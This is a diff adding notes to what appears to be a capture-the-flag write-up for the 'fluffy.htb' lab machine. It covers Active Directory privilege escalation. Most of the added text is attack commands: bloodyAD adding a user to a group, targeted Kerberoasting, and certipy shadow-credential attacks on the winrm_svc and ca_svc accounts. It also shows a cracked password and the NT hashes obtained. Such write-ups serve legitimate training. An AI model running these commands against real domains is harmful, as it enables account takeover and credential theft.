@@ -9,3 +9,23 @@ cracking gives:
 prometheusx-303  (p.agila) 
 
 the user winrm_svc is in the Remote manager group
+
+p.agila has generic all su service accounts which has generic write on winrm so first we add ourself to the group
+
+`bloodyAD -d fluffy.htb --host 10.10.11.69 -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila`
+
+now bloodhound suggests a targetedKerberoasting exploiting the GenericWrite or Shadow Credentials attack:
+
+
+`python3 /opt/tools/targetedKerberoast.py -v -d 'fluffy.htb' -u p.agila -p prometheusx-303 --request-user winrm_svc`
+
+with the first one we obtain a ticket to crack
+with the second one we obtain both the ticket and the NT hash
+`certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p "prometheusx-303" -account 'winrm_svc' -dc-ip '10.10.11.69'`
+
+winrm_svc :33bd09dcd697600edf6b3a7af4875767
+
+having also generic write to ca_svc we do the same:
+`certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p "prometheusx-303" -account 'ca_svc' -dc-ip '10.10.11.69'`
+
+ca_svc :ca0f4f9e9eb8a092addf53bb03fc98c8
